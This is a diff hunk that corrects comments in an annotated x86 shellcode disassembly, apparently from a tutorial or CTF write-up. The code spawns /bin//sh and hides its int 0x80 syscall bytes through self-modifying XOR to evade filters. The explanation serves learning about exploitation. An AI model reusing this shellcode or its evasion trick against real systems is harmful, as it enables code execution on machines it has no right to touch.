@@ -47,13 +47,13 @@ here is where shellcode from
 8:  68 2f 2f 73 68          push   0x68732f2f  ; push hs//
 d:  68 2f 62 69 6e          push   0x6e69622f  ; push nib/
 12: 54                      push   esp
-13: 5b                      pop    ebx         ; ebx hold address of /bn//sh\x00
+13: 5b                      pop    ebx         ; ebx hold address of /bin//sh\x00
 14: 6a 23                   push   0x23        ; make eax = 0
 16: 58                      pop    eax         ;     ''
 17: 34 23                   xor    al,0x23     ;     ''
 19: 50                      push   eax
 1a: 59                      pop    ecx         ; ecx = 0
-1b: 49                      dec    ecx         ; ecx = 0xffffffff. ecx = cx + ah + al
+1b: 49                      dec    ecx         ; ecx = 0xffffffff. ecx = cx + ch + cl
 1c: 30 4e 2c                xor    BYTE PTR [esi+0x2c],cl   ; make byte 0x2c of shellcode equal to 0xcd (= 0x32^0xff)
 1f: 49                      dec    ecx         ; ecx = 0xfffffffe
 20: 30 4e 2d                xor    BYTE PTR [esi+0x2d],cl   ; make byte 0x2d of shellcode equal to 0x80 (= 0x7e^0xfe)
